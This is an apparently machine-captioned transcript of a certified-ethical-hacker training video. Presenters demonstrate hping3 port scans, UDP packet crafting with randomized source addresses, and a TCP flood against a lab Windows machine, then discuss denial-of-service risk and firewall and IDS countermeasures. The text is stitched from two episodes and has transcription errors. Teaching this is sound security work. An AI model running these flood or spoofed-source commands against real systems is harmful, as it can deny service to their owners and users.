you.\n\n712\n00:33:38.490 --> 00:33:40.280\nThe methodology is what's important,\n\n713\n00:33:40.280 --> 00:33:43.640\nthat becomes portable tool to tool,\nsystem to system.\n\n714\n00:33:43.640 --> 00:33:46.040\nThe tool set itself is really\nunique to your skills and\n\n715\n00:33:46.040 --> 00:33:49.050\nalso unique to the operational\nenvironment which you find yourselves in.\n\n716\n00:33:49.050 --> 00:33:52.090\nNo right or wrong in other words which\nI've said in regards to tool selection,\n\n717\n00:33:52.090 --> 00:33:55.622\nbut definitely right or wrong in regards\nto understanding the methodology.\n\n718\n00:33:55.622 --> 00:33:59.393\n>> All right Adam, a great look there at\nscanning and what it involves, what we're\n\n719\n00:33:59.393 --> 00:34:03.015\nlooking for, some of the tools which\nwe might use, how we might apply those.\n\n720\n00:34:03.015 --> 00:34:04.557\nAnd again in upcoming episodes,\n\n721\n00:34:04.557 --> 00:34:08.200\nwe're actually gonna take a look at a\ncouple of those and do some scans for you.\n\n722\n00:34:08.200 --> 00:34:10.870\nSo we hope everybody out there\nenjoyed watching this one.\n\n723\n00:34:10.870 --> 00:34:13.470\nSigning off for ITPro.TV,\nI've been your host Mike Roderick.\n\n724\n00:34:13.470 --> 00:34:14.649\n>> Who am I?\n\n725\n00:34:14.649 --> 00:34:17.383\n>> TCP\n>> I'm super scanner 4.1.\n\n726\n00:34:17.383 --> 00:34:18.102\n>> You're a fin flag.\n\n727\n00:34:18.102 --> 00:34:19.894\n>> I'm fin flag\n>> There we go, [LAUGH] and\n\n728\n00:34:19.894 --> 00:34:21.068\nwe'll see you next time.\n\n729\n00:34:21.068 --> 00:34:21.768\n>> Take care everybody.\n\n730\n00:34:21.768 --> 00:34:29.405\n[MUSIC]\n\n",

00:00:19.050\nI'm your host Mike Rodrick, and\ntoday we're doing CEH version nine.\n\n4\n00:00:19.050 --> 00:00:20.900\nAnd specifically in this episode,\n\n5\n00:00:20.900 --> 00:00:24.040\nwe're continuing on our thought\nprocess going over scanning.\n\n6\n00:00:24.040 --> 00:00:27.740\nWe've been talking a little bit about\nwhat the concept of scanning is,\n\n7\n00:00:27.740 --> 00:00:31.545\nsome of the different, tools we would\nuse to do scanning both scanning for\n\n8\n00:00:31.545 --> 00:00:33.895\nlive hosts doing network scans.\n\n9\n00:00:33.895 --> 00:00:36.845\nNow we're going to step back and\ntake a look at some of these tools and\n\n10\n00:00:36.845 --> 00:00:40.285\nactually put them to use, and\nhere to do that for us is Mr. Adam Gordon.\n\n11\n00:00:40.285 --> 00:00:41.230\nHow you doing Adam?\n\n12\n00:00:41.230 --> 00:00:41.760\n>> Good, good.\n\n13\n00:00:41.760 --> 00:00:42.340\nI'm doing very well.\n\n14\n00:00:42.340 --> 00:00:44.280\nHopefully everybody out there is as well.\n\n15\n00:00:44.280 --> 00:00:46.130\nYeah, we're going to take a look at,\nas Mike was saying,\n\n16\n00:00:46.130 --> 00:00:47.890\ntalk a bit about how to\nuse some of these tools.\n\n17\n00:00:47.890 --> 00:00:50.700\nWe're going to move over to our lab\nenvironment here in just a minute.\n\n18\n00:00:50.700 --> 00:00:53.720\nWe're going to spend some\ntime in Kali Linux as we have\n\n19\n00:00:53.720 --> 00:00:57.060\nin some of the prior episodes where\nwe've done some demos for you.\n\n20\n00:00:57.060 --> 00:01:00.920\nWe'll take a look at hping3,\na tool built into the Kali Linux suite,\n\n21\n00:01:00.920 --> 00:01:04.250\nto be able do pinging and\npacket manipulation.\n\n22\n00:01:04.250 --> 00:01:08.182\nThen we'll take a look at and look, or\nrather work with on the Windows side,\n\n23\n00:01:08.182 --> 00:01:11.260\nat Zenmap, which is Window's port of mmap,\na little bit.\n\n24\n00:01:11.260 --> 00:01:12.160\nWe'll play around in there.\n\n25\n00:01:12.160 --> 00:01:15.780\nI've got Wireshark up and running so\nwe'll do some pinging, some scanning.\n\n26\n00:01:15.780 --> 00:01:18.250\nWe'll take a look at that traffic,\nsee it captured,\n\n27\n00:01:18.250 --> 00:01:21.210\nand we'll talk some packet\ncapturing in general.\n\n28\n00:01:21.210 --> 00:01:22.710\nWireshark is a great program.\n\n29\n00:01:22.710 --> 00:01:26.760\nThere are some others out there that\nare equally impressive and are free.\n\n30\n00:01:26.760 --> 00:01:29.700\nPackitizers, a tool I use a lot as well,\nand\n\n31\n00:01:29.700 --> 00:01:31.880\nthat's also a very good capture program.\n\n32\n00:01:31.880 --> 00:01:33.868\nSo let's move over to the lab machine,\nif we can.\n\n33\n00:01:33.868 --> 00:01:36.933\nI'm gonna wander over here for a second,\nthen you're gonna see me disappear,\n\n34\n00:01:36.933 --> 00:01:37.583\njust like that.\n\n35\n00:01:37.583 --> 00:01:40.649\nAnd so let's talk a little bit\nabout what we're gonna do.\n\n36\n00:01:40.649 --> 00:01:45.522\nI have, in Kali, in the virtual machine\nthat we've got running Kali on,\n\n37\n00:01:45.522 --> 00:01:47.262\nalready loaded up hping.\n\n38\n00:01:47.262 --> 00:01:50.206\nLet me just minimize, or\nactually not even minimize,\n\n39\n00:01:50.206 --> 00:01:53.598\nlet me just come over here really\nquick and just show you that as I\n\n40\n00:01:53.598 --> 00:01:57.694\nthink we did in the last run through we\ndid where we took a look at the desktop,\n\n41\n00:01:57.694 --> 00:02:00.290\nwe have this show\napplication browser here.\n\n42\n00:02:00.290 --> 00:02:03.240\nWe can click to get\nthe application profile\n\n43\n00:02:03.240 --> 00:02:04.820\nlisting all the little tiles, right?\n\n44\n00:02:04.820 --> 00:02:05.695\nAnd we can search.\n\n45\n00:02:05.695 --> 00:02:06.635\n>> Mm-hm.\n>> And just search for\n\n46\n00:02:06.635 --> 00:02:09.580\nhping if we don't know\nwhat category it's in.\n\n47\n00:02:09.580 --> 00:02:11.458\nBring up the hping3 and launch it.\n\n48\n00:02:11.458 --> 00:02:13.379\nThere's an earlier version\nof the tool hping2.\n\n49\n00:02:13.379 --> 00:02:16.001\nIt's really just a question of\nwhich version you're running and\n\n50\n00:02:16.001 --> 00:02:17.010\nwhere you find the tool.\n\n51\n00:02:17.010 --> 00:02:18.710\nWe're gonna use hping3.\n\n52\n00:02:18.710 --> 00:02:23.500\nSo in here I've gone ahead and just set up\nsome things and just done some pinging and\n\n53\n00:02:23.500 --> 00:02:27.480\ndone some scanning already just to have\nsome traffic flowing into our monitor and\n\n54\n00:02:27.480 --> 00:02:28.055\nEthereal.\n\n55\n00:02:28.055 --> 00:02:28.590\n>> Mm-hm.\n>> Or,\n\n56\n00:02:28.590 --> 00:02:29.090\nexcuse me-\n>> [LAUGH]\n\n57\n00:02:29.090 --> 00:02:30.070\n>> Wireshark.\n\n58\n00:02:30.070 --> 00:02:30.990\nShowing my age here.\n\n59\n00:02:30.990 --> 00:02:32.760\n>> Yep.\n>> And so what I did for\n\n60\n00:02:32.760 --> 00:02:37.510\nthe first one is I issued\nthe following command, hping3 then\n\n61\n00:02:37.510 --> 00:02:42.620\ndash space dash dash scan space 1 to 3000,\nthat's going to be\n\n62\n00:02:42.620 --> 00:02:46.805\nthe number of the port range that I\nwant to scan, so I am going to scan.\n\n63\n00:02:46.805 --> 00:02:49.095\nScanning the switch scan says scan for\nthe following,\n\n64\n00:02:49.095 --> 00:02:51.535\nand we're gonna then\nspecify the port range.\n\n65\n00:02:51.535 --> 00:02:55.745\nThen capital S, so\nbig S, dash minus big S.\n\n66\n00:02:55.745 --> 00:02:59.775\nAnd then the target IP address,\nwhatever the target IP will be.\n\n67\n00:02:59.775 --> 00:03:04.155\nIn this case, I've loaded up\nthe target IP of my Windows 8 machine.\n\n68\n00:03:04.155 --> 00:03:07.175\nAnd so when I hit Enter to do that,\nit's gonna go out.\n\n69\n00:03:07.175 --> 00:03:08.725\nAnd what did I do there?\n\n70\n00:03:08.725 --> 00:03:10.560\nDid I miss something?\n\n71\n00:03:10.560 --> 00:03:11.800\nMissing host argument.\n\n72\n00:03:11.800 --> 00:03:13.480\nI thought I had that in there.\n\n73\n00:03:14.508 --> 00:03:15.956\nNo I do have it in there.\n\n74\n00:03:15.956 --> 00:03:16.664\nLet me type that in again.\n\n75\n00:03:16.664 --> 00:03:17.990\nOne second.\n\n76\n00:03:17.990 --> 00:03:22.460\nI just Up arrowed in the buffer there\nto put it back in and I may have\n\n77\n00:03:22.460 --> 00:03:26.750\ninadvertently left a space or erased\nsomething, so we just type that back in.\n\n78\n00:03:26.750 --> 00:03:27.330\nThat's what I get for\n\n79\n00:03:27.330 --> 00:03:31.416\ntrying to be lazy and\nnot put the whole thing in from scratch.\n\n80\n00:03:31.416 --> 00:03:32.770\nMinus capital S.\n\n81\n00:03:32.770 --> 00:03:33.900\nI think I know why.\n\n82\n00:03:33.900 --> 00:03:37.195\nI think it was lower case s, that may\nbe why it was not coming up there.\n\n83\n00:03:37.195 --> 00:03:42.235\nAll right, 10.1, whoops,\n\n84\n00:03:42.235 --> 00:03:46.921\n10.1.230.220.\n\n85\n00:03:46.921 --> 00:03:47.910\nHit Enter.\n\n86\n00:03:47.910 --> 00:03:52.080\nThere we go, and we're then gonna be\nable to scan the Windows 8 machine.\n\n87\n00:03:52.080 --> 00:03:54.990\nNow, while that's scanning,\njust gonna minimize that and\n\n88\n00:03:54.990 --> 00:03:57.390\ncome over here to the Windows\n8 machine real quick.\n\n89\n00:03:57.390 --> 00:03:59.050\nWe've got that running on live.\n\n90\n00:03:59.050 --> 00:04:00.690\nLet's bring up Wireshark.\n\n91\n00:04:00.690 --> 00:04:03.140\nWe can see that scanning\ntraffic coming in and\n\n92\n00:04:03.140 --> 00:04:05.680\nbeing recorded in Wireshark in real time.\n\n93\n00:04:05.680 --> 00:04:08.660\nThere's some SSDP packets that\nwe were just talking about.\n\n94\n00:04:08.660 --> 00:04:12.085\nThere's some ARP,\nthere's some mDNS, NetBIOS,\n\n95\n00:04:12.085 --> 00:04:13.233\nwhole bunch of stuff coming through.\n\n96\n00:04:13.233 --> 00:04:16.425\nAnd so we're seeing not just the scan\ntraffic, but all sorts of other stuff, but\n\n97\n00:04:16.425 --> 00:04:20.185\nwe are obviously capturing that\npacket traffic in real time.\n\n98\n00:04:20.185 --> 00:04:23.649\nSo when that's done, when that scan\nfinishes, let's come back here.\n\n99\n00:04:25.010 --> 00:04:32.451\nWe'll get a listing in Kali,\ninside of hping, of all that information.\n\n100\n00:04:32.451 --> 00:04:36.960\nNow, this may not be the best\nway to be able to see.\n\n101\n00:04:36.960 --> 00:04:39.740\nI'm gonna scan up, it's a little slow,\nor rather scroll up.\n\n102\n00:04:39.740 --> 00:04:42.360\nIt may not be the easiest\nway to see all this, right?.\n\n103\n00:04:42.360 --> 00:04:45.506\nIt lists all the non-responsive ports so\nprobably don't want to have all that,\n\n104\n00:04:45.506 --> 00:04:46.860\nwe don't really care about that.\n\n105\n00:04:46.860 --> 00:04:49.340\nWhat we want is the stuff on top.\n\n106\n00:04:49.340 --> 00:04:52.005\nIf I can just get it to scroll back up and\nnot move back down again.\n\n107\n00:04:52.005 --> 00:04:52.920\n>> [LAUGH]\n>> So\n\n108\n00:04:52.920 --> 00:04:55.591\nlet's just give that a second to stay\nwith us and to actually move up.\n\n109\n00:04:55.591 --> 00:04:56.590\nThere we go.\n\n110\n00:04:56.590 --> 00:05:00.010\nAnd what we want to see is\nthe ports right up top,\n\n111\n00:05:00.010 --> 00:05:03.440\nup here, that are the ones that\nare actually on and active, right?\n\n112\n00:05:03.440 --> 00:05:06.090\nAnd so [LAUGH] that's why I love-\n>> [LAUGH]\n\n113\n00:05:06.090 --> 00:05:08.190\n>> I absolutely love the mouse and\n\n114\n00:05:08.190 --> 00:05:11.710\nthe touch pad on this\nmachine that we're using.\n\n115\n00:05:11.710 --> 00:05:12.930\nNothing but the best here.\n\n116\n00:05:12.930 --> 00:05:14.450\nThis is awesome.\n\n117\n00:05:14.450 --> 00:05:16.700\nAnd so\nwhat we can see when we actually are done,\n\n118\n00:05:16.700 --> 00:05:20.060\nwe get an output of everything we want,\nthe actual ports that are open.\n\n119\n00:05:20.060 --> 00:05:21.240\nWe can output that to a text file.\n\n120\n00:05:21.240 --> 00:05:23.033\nIt's probably the best\nway to deal with that.\n\n121\n00:05:23.033 --> 00:05:26.414\nQuite honestly, looking at it in\nthe console may not be the best way to\n\n122\n00:05:26.414 --> 00:05:29.563\nactually work with it but\nyou could see the open ports are there,\n\n123\n00:05:29.563 --> 00:05:32.100\nand then of course all\nthe non-responsive ports.\n\n124\n00:05:32.100 --> 00:05:37.676\nNow, I only went ahead and\nI only actually scanned for the first.\n\n125\n00:05:37.676 --> 00:05:39.920\nLet's just kill this and come back to it.\n\n126\n00:05:39.920 --> 00:05:40.990\nI only scanned for\n\n127\n00:05:40.990 --> 00:05:46.870\nthe first 3,000 ports of the 65,535\nthat may actually be available.\n\n128\n00:05:46.870 --> 00:05:48.350\nSo we wanna keep that in mind and\n\n129\n00:05:48.350 --> 00:05:51.505\nbe aware of the fact,\nwhile I'm just opening up hping again,\n\n130\n00:05:51.505 --> 00:05:56.150\nne aware of the fact we could scan for\na whole bunch of ports and port ranges.\n\n131\n00:05:56.150 --> 00:05:59.260\nSo let's just type back in hping,\njust get that to come up.\n\n132\n00:05:59.260 --> 00:06:02.110\nYou'll see just searching for it there\nis going to open it back up again,\n\n133\n00:06:02.110 --> 00:06:05.630\nclean it up and start from scratch so\nit becomes a little bit more responsive.\n\n134\n00:06:05.630 --> 00:06:08.050\nWe do have some information there\nabout the different switches,\n\n135\n00:06:08.050 --> 00:06:10.820\nwhich is what I was trying to show\nyou at the top there as well,\n\n136\n00:06:10.820 --> 00:06:14.750\nthat gives us some information about\nhow to crop the scans we wanna use.\n\n137\n00:06:14.750 --> 00:06:15.640\nDefinitely important.\n\n138\n00:06:15.640 --> 00:06:18.540\nYou and I were just talking about\nthis before we started the episode.\n\n139\n00:06:18.540 --> 00:06:21.390\nDefinitely important for\nyou to take some time,\n\n140\n00:06:21.390 --> 00:06:24.430\nread up on those help files,\nunderstand the various switches or\n\n141\n00:06:24.430 --> 00:06:26.820\nparameters that may be able\nto be used with the tool.\n\n142\n00:06:26.820 --> 00:06:28.039\nYou can obviously look,\n\n143\n00:06:28.039 --> 00:06:31.819\nat the beginning of a tool like this they\ndo publish the help file, and see it.\n\n144\n00:06:31.819 --> 00:06:35.998\nIf not, you can always do a get help or\nman for the man page or man dash p for\n\n145\n00:06:35.998 --> 00:06:38.647\npage or man,\nall that kind of thing depending\n\n146\n00:06:38.647 --> 00:06:42.020\non the structure of the program\nto look for the help file.\n\n147\n00:06:42.020 --> 00:06:45.930\nWe've shown you how you could go out and\nuse Google to find mmap information.\n\n148\n00:06:45.930 --> 00:06:48.650\nSame thing with hping, wouldn't\nreally matter what you're doing, but\n\n149\n00:06:48.650 --> 00:06:50.300\nthe idea is that we do want to go out and\n\n150\n00:06:50.300 --> 00:06:54.120\nfind information that's gonna help us\nto understand how to use the tool.\n\n151\n00:06:54.120 --> 00:06:54.930\nWe could sit here and\n\n152\n00:06:54.930 --> 00:06:58.725\ntry to randomly try to type stuff in but\nit's probably not very effective, right?\n\n153\n00:06:58.725 --> 00:07:00.070\n>> [LAUGH]\n>> We do need to understand that.\n\n154\n00:07:00.070 --> 00:07:03.014\nSo for instance, if I wanted to go in and\n\n155\n00:07:03.014 --> 00:07:09.087\nI wanted to type in the following command,\nhping3, and then I wanna go ahead and\n\n156\n00:07:09.087 --> 00:07:14.121\nI wanna type in the IP address of\nthe source that we are going to use.\n\n157\n00:07:14.121 --> 00:07:19.983\nWe're going to go head and type in\nthe IP address of the Windows 8 machine,\n\n158\n00:07:19.983 --> 00:07:22.412\n10.1.230.223.\n\n159\n00:07:22.412 --> 00:07:27.456\nWe'll have whatever IP address, obviously,\n\n160\n00:07:27.456 --> 00:07:34.390\nyou're going to use for\nwhatever target machine you want to use,\n\n161\n00:07:34.390 --> 00:07:39.432\nand then we're going to\ntype in the following,\n\n162\n00:07:39.432 --> 00:07:44.118\n--UDP -rand-source --data 500.\n\n163\n00:07:44.118 --> 00:07:47.170\nSo this is a little bit of\na different approach here, right?\n\n164\n00:07:47.170 --> 00:07:50.042\nWhat we're going to do is\nwe're going to go ahead and\n\n165\n00:07:50.042 --> 00:07:52.344\nwe're gonna perform a UDP packet craft.\n\n166\n00:07:52.344 --> 00:07:56.379\nWe are going to craft UDP packets for\nsending them out against this system and\n\n167\n00:07:56.379 --> 00:07:59.405\nwhat we are then going to do\nis observe the UDP packets, or\n\n168\n00:07:59.405 --> 00:08:03.692\nwe could if we bother to go to the Windows\nmachine to look at them in Wireshark, but\n\n169\n00:08:03.692 --> 00:08:07.981\nessentially What this'll do is,\nthis'll send 500 UDP packets against that\n\n170\n00:08:07.981 --> 00:08:12.400\ntarget machine, one at a time over\nseveral minutes, however long it takes.\n\n171\n00:08:12.400 --> 00:08:13.970\nAnd it will send those out, and\n\n172\n00:08:13.970 --> 00:08:17.030\nthen we can see the effect of\nthat on the target machine.\n\n173\n00:08:17.030 --> 00:08:21.170\nAnd so we do that, and,\ndid I miss something in there?\n\n174\n00:08:21.170 --> 00:08:23.680\nRan dash source, so maybe I missed a dash.\n\n175\n00:08:23.680 --> 00:08:24.670\nDash, dash.\n\n176\n00:08:24.670 --> 00:08:25.620\nNo, that should be correct.\n\n177\n00:08:25.620 --> 00:08:28.860\nSpace, dash, dash, edp,\ndash ran dash source dash data.\n\n178\n00:08:28.860 --> 00:08:32.560\nI may have not put in all of\nthe double dashes, let me see.\n\n179\n00:08:32.560 --> 00:08:34.380\nI left one out on rand that's why.\n\n180\n00:08:34.380 --> 00:08:36.950\nThat one single dash there for\nrand should have two.\n\n181\n00:08:36.950 --> 00:08:39.180\nSo that's kind of things you\nhad to pay attention to,\n\n182\n00:08:39.180 --> 00:08:43.820\nright cuz double dashes means something,\nsingle dashes means switch and\n\n183\n00:08:43.820 --> 00:08:46.375\nyou'll that sometimes doesn't\nalways fire off the right way.\n\n184\n00:08:46.375 --> 00:08:47.590\n>> [LAUGH]\n>> As you can see.\n\n185\n00:08:47.590 --> 00:08:49.340\nThis is live boys and girls, right?\n\n186\n00:08:49.340 --> 00:08:51.090\nAnd we are doing this right off the cuff.\n\n187\n00:08:51.090 --> 00:08:53.970\nSo literally sometimes you gotta pay\nattention to every little detail.\n\n188\n00:08:53.970 --> 00:08:55.430\n>> Yeah.\n>> And a little bit hard to see\n\n189\n00:08:55.430 --> 00:08:57.360\nin the virtual window\nthere when we're typing.\n\n190\n00:08:57.360 --> 00:09:00.420\nBut you could see that sending packets.\n\n191\n00:09:00.420 --> 00:09:04.600\nAnd so now, as I come over here,\nand I go over here,\n\n192\n00:09:04.600 --> 00:09:08.500\nwe could see those UDP packets as\nthey go streaming by, coming in.\n\n193\n00:09:08.500 --> 00:09:11.690\nThere's one,\nI think I just hit one right there,\n\n194\n00:09:11.690 --> 00:09:14.370\ngotta be quick if I don't\nstop it actually bring it up.\n\n195\n00:09:14.370 --> 00:09:16.790\nBut you can see, nope that's an r packet.\n\n196\n00:09:16.790 --> 00:09:21.920\nLet me see if I can grab a UDP packet and\nget one, there's one right there.\n\n197\n00:09:21.920 --> 00:09:25.145\nAnd so that you DP packet is\nallowing us to be able to, or\n\n198\n00:09:25.145 --> 00:09:28.605\nthat packet that I just highlighted,\nis allowing us to see in Wire Shark,\n\n199\n00:09:28.605 --> 00:09:29.925\nthe packet I'm actually bringing it up.\n\n200\n00:09:29.925 --> 00:09:33.195\nSo we can examine it, you can see it's\nrunning a little bit slow on the virtual\n\n201\n00:09:33.195 --> 00:09:36.245\nmachine because we're actually\ncapturing live to memory.\n\n202\n00:09:36.245 --> 00:09:38.525\nWe're running about three or\nfour tools simultaneously.\n\n203\n00:09:38.525 --> 00:09:40.365\nAnd it takes a lot of resources, but\n\n204\n00:09:40.365 --> 00:09:44.475\nin Wire Shark I can double click on a\npacket out of a live capture as I'm doing.\n\n205\n00:09:44.475 --> 00:09:47.540\nAnd I can actually freeze it so\nto speak on the screen to look at it.\n\n206\n00:09:47.540 --> 00:09:50.640\nI can just drill down into the frame if\nI wanna see what's going on with it and\n\n207\n00:09:50.640 --> 00:09:54.760\nI can examine an individual packet or\njust let the packet stream by.\n\n208\n00:09:54.760 --> 00:10:00.150\nAnd I can go in and I can look and\nI can see that as I go in and\n\n209\n00:10:00.150 --> 00:10:05.240\nI take a look in here, under UDP, I can\nsee that you know we got information.\n\n210\n00:10:05.240 --> 00:10:07.120\nI can see the length there.\n\n211\n00:10:07.120 --> 00:10:10.100\nI can see a whole bunch of\ninformation about this.\n\n212\n00:10:10.100 --> 00:10:12.560\nThis is not one of\nthe packets that I crafted.\n\n213\n00:10:12.560 --> 00:10:15.090\nThis is just a random Unity\npacket that I happened to grab.\n\n214\n00:10:15.090 --> 00:10:17.250\nThe length would be 500 there.\n\n215\n00:10:17.250 --> 00:10:20.960\nIf I actually had one of my packets,\nit would be the one that I had sent,\n\n216\n00:10:20.960 --> 00:10:24.800\nbut I'd be able to tell where the pocket's\ncoming from, where it's going to.\n\n217\n00:10:24.800 --> 00:10:26.700\nI could see information about it.\n\n218\n00:10:26.700 --> 00:10:29.670\nI'm capturing all the traffic on our\nnetwork right now including anything\n\n219\n00:10:29.670 --> 00:10:32.800\nthat's going on in the other studios and\nanything on the range.\n\n220\n00:10:32.800 --> 00:10:34.161\n>> Let me close my browser.\n\n221\n00:10:34.161 --> 00:10:37.409\n>> [LAUGH] So I wanna make sure we're not\ntaking a look anything we shouldn't be,\n\n222\n00:10:37.409 --> 00:10:38.985\nbut I'm capturing all of that traffic.\n\n223\n00:10:38.985 --> 00:10:41.250\nSo, you have got quite\na bit of packets coming in.\n\n224\n00:10:41.250 --> 00:10:43.290\nI've got a few,\ntake a look down at the bottom.\n\n225\n00:10:43.290 --> 00:10:45.940\n[INAUDIBLE] over 2 million\npackets in the capture buffer.\n\n226\n00:10:45.940 --> 00:10:49.190\nSo seeing quiet a bit of\ntraffic going on here.\n\n227\n00:10:49.190 --> 00:10:52.780\nSo we could go and then we could\ngather a great deal of information\n\n228\n00:10:52.780 --> 00:10:55.830\nby using a tool like this to start\nprobing, doing some scanning.\n\n229\n00:10:55.830 --> 00:11:00.400\nAnd then, obviously, on the flip side here\nI would wanna be capturing some data so\n\n230\n00:11:00.400 --> 00:11:03.250\nwe could see whether or not we're\ngetting the right responses back.\n\n231\n00:11:03.250 --> 00:11:06.320\nKind of what we wanna look for\nthings like that.\n\n232\n00:11:06.320 --> 00:11:10.990\nI may send a TCP syn scanning and\nsee what that's look like.And so\n\n233\n00:11:10.990 --> 00:11:17.240\nI could go back into, just minimize out of\nmy Windows there we go, go back into Kale.\n\n234\n00:11:18.720 --> 00:11:22.720\nAnd we'll do one more here so\nwe'll just break this right and\n\n235\n00:11:22.720 --> 00:11:27.530\nyou'll see that I have not sent all the\npacks I just basically stopped before it\n\n236\n00:11:27.530 --> 00:11:30.130\nwent through and\nsent everything but that's fine.\n\n237\n00:11:30.130 --> 00:11:33.720\nWe sent 162 packets out\nthe 500 I was trying to send.\n\n238\n00:11:33.720 --> 00:11:36.800\nSo we're gonna go through,\ndo another command line here.\n\n239\n00:11:36.800 --> 00:11:38.850\nThis time we'll do a sin scanner.\n\n240\n00:11:38.850 --> 00:11:40.740\nWe'll send some sim packets rather.\n\n241\n00:11:40.740 --> 00:11:45.630\nSo do hping3, this case minus capital S.\n\n242\n00:11:45.630 --> 00:11:48.800\nAgain we'll do the target IP.\n\n243\n00:11:48.800 --> 00:11:54.014\nGo back and grab that cuz my short\nterm memory is non-existent today.\n\n244\n00:11:54.014 --> 00:11:58.596\n[LAUGH] So we'll 10.1.230.223,\n\n245\n00:11:58.596 --> 00:12:05.630\nthat's our target machine that we're using\nobviously, if you set this up and do this.\n\n246\n00:12:05.630 --> 00:12:09.450\nIn your environment, you're gonna target\nwhatever machine you wanna see that for.\n\n247\n00:12:09.450 --> 00:12:13.000\nWe're gonna do a p there for port 80.\n\n248\n00:12:13.000 --> 00:12:20.420\nWe're gonna do this and set this to 5 and\nwe're gonna hit Enter there.\n\n249\n00:12:20.420 --> 00:12:25.960\nAnd so what we're gonna do is send\nout a series of sin packets and\n\n250\n00:12:25.960 --> 00:12:29.300\nwe're going to send those,\nwe're going to pass those through port 80.\n\n251\n00:12:29.300 --> 00:12:32.470\nThe dash P80 is the port we specify for\nthe target and\n\n252\n00:12:32.470 --> 00:12:35.180\nC is the count of packets\nthat we're sending.\n\n253\n00:12:35.180 --> 00:12:39.360\nSo, this commands String lets\nme send a bunch of packets,\n\n254\n00:12:39.360 --> 00:12:44.150\nfive in all, -c 5 for count against\nport 80 on the target machine.\n\n255\n00:12:44.150 --> 00:12:45.920\nYou could see those go out and\n\n256\n00:12:45.920 --> 00:12:49.870\ncome back right there in\nthe command buffer for hping3.\n\n257\n00:12:49.870 --> 00:12:53.430\nAnd allows us to see that we sent\nfive packets through against port 80,\n\n258\n00:12:53.430 --> 00:12:57.490\nand I can go to the Windows machine,\nand monitor that, and see the response.\n\n259\n00:12:57.490 --> 00:13:00.950\nAnd I'd be able to see whether or\nnot the machine, if it does respond,\n\n260\n00:13:00.950 --> 00:13:04.690\nshows certain information as it\ncomes back and gives me a better\n\n261\n00:13:04.690 --> 00:13:08.640\nindication of the kind of information that\nmay be available on the Windows machine,\n\n262\n00:13:08.640 --> 00:13:11.120\nthe kind of services that are running,\nthings of that nature.\n\n263\n00:13:12.230 --> 00:13:17.570\nI can also go ahead and I can do a flood\nof TCP packets against the machine.\n\n264\n00:13:17.570 --> 00:13:20.830\nKind of a continuous flood\nof system packets so\n\n265\n00:13:20.830 --> 00:13:22.890\nI can see what the effect of that will be.\n\n266\n00:13:22.890 --> 00:13:27.180\nWe can use this tool to do that as well,\nlet's go type that in.\n\n267\n00:13:27.180 --> 00:13:27.910\nSo 10 and .1.230.223.\n\n268\n00:13:27.910 --> 00:13:32.000\nAnd now we're gonna go ahead and\n\n269\n00:13:32.000 --> 00:13:35.835\nwe're gonna do --flood.\n\n270\n00:13:35.835 --> 00:13:38.930\nAnd then hit enter.\n\n271\n00:13:38.930 --> 00:13:40.070\nAnd let's see.\n\n272\n00:13:40.070 --> 00:13:41.980\nNo flags set in between flood modes.\n\n273\n00:13:41.980 --> 00:13:43.210\nFlood mode, excuse me.\n\n274\n00:13:43.210 --> 00:13:47.170\nNo replies will be shown, so we're\nflooding packets out against that machine.\n\n275\n00:13:47.170 --> 00:13:51.690\nAnd then again what I can do would be\nto go to either the machine that I'm\n\n276\n00:13:51.690 --> 00:13:54.910\ntargeting or set a monitor up\nsomewhere to capture the traffic.\n\n277\n00:13:54.910 --> 00:13:58.270\nIt doesn't have to be on the machine\ncuz clearly If I'm on the machine then,\n\n278\n00:13:58.270 --> 00:14:01.160\nunless I'm doing a vulnerability\nassessment where I control both ends.\n\n279\n00:14:01.160 --> 00:14:04.220\nAs a pen test I would probably never\nbe able to get to the target machine,\n\n280\n00:14:04.220 --> 00:14:06.730\ninstall monitoring software,\nrun it in real time.\n\n281\n00:14:06.730 --> 00:14:07.950\nI just don't have that capability.\n\n282\n00:14:07.950 --> 00:14:11.370\nWe're doing that here to show you\nessentially write what the output\n\n283\n00:14:11.370 --> 00:14:12.190\nmay look like.\n\n284\n00:14:12.190 --> 00:14:16.260\nBut you can see here, I'm flooding\nthe machine, and you can see all the TCP\n\n285\n00:14:16.260 --> 00:14:20.510\npackets that are coming in and are just\nslamming this machine in real time.\n\n286\n00:14:20.510 --> 00:14:21.850\nI mean look at that traffic flow.\n\n287\n00:14:21.850 --> 00:14:23.820\nIt's all TCP packets right now.\n\n288\n00:14:23.820 --> 00:14:28.040\nAnd that's all I'm seeing coming in and\nit's all coming from the same source.\n\n289\n00:14:28.040 --> 00:14:28.880\nThis could be\n\n290\n00:14:28.880 --> 00:14:30.760\nused to create a denial of service-\n>> Right.\n\n291\n00:14:30.760 --> 00:14:34.110\n>> Or multiple machines\nexecuting this simultaneously.\n\n292\n00:14:34.110 --> 00:14:35.630\nCould be a distributed denial of service.\n\n293\n00:14:35.630 --> 00:14:38.830\nAttack vector that\na hacker may try to use.\n\n294\n00:14:38.830 --> 00:14:42.020\nWe would want to be able to see that and\nknow that at the gateway.\n\n295\n00:14:42.020 --> 00:14:44.110\nAnd try to block this traffic coming in.\n\n296\n00:14:44.110 --> 00:14:48.320\nSo one of the counter measures we'd want\nto think about would be is our firewall,\n\n297\n00:14:48.320 --> 00:14:53.970\nare our IDS, IPS, IDPS gateway\ndevices dropping this kind of traffic.\n\n298\n00:14:53.970 --> 00:14:56.200\nDo we allow ping packets\nin in the first place?\n\n299\n00:14:56.200 --> 00:14:59.180\nWe probably shouldn't allow ping\ntraffic in bound anyway, right?\n\n300\n00:14:59.180 --> 00:15:03.290\nSo we if we're not blocking it, it could\nbe executing a denial of service attack\n\n301\n00:15:03.290 --> 00:15:06.840\nagainst this machine right now and\nI am in one respect live in real time,\n\n302\n00:15:06.840 --> 00:15:09.880\nas we see the scan unfolding and\ntaking place here.\n\n303\n00:15:09.880 --> 00:15:12.500\nSo this is something we really have\nto be aware of and really think\n\n304\n00:15:13.760 --> 00:15:16.740\nabout the potential liabilities of,\nbecause without meaning to, and\n\n305\n00:15:16.740 --> 00:15:20.070\nthis is something else as an ethical\nhacker, you need to be aware of.\n\n306\n00:15:20.070 --> 00:15:25.090\nWithout meaning to, I may actually take\ndown the system that I'm trying to scan,\n\n307\n00:15:25.090 --> 00:15:26.610\nif I'm not careful in production.\n\n308\n00:15:26.610 --> 00:15:28.440\nAnd we have to be very aware of that.\n\n309\n00:15:28.440 --> 00:15:31.480\nThis little ping right here, this one\nthing, it's not gonna execute a denial of\n\n310\n00:15:31.480 --> 00:15:34.705\nservice attack that's so\nvicious that I can't operate the machine.\n\n311\n00:15:34.705 --> 00:15:37.530\n>> 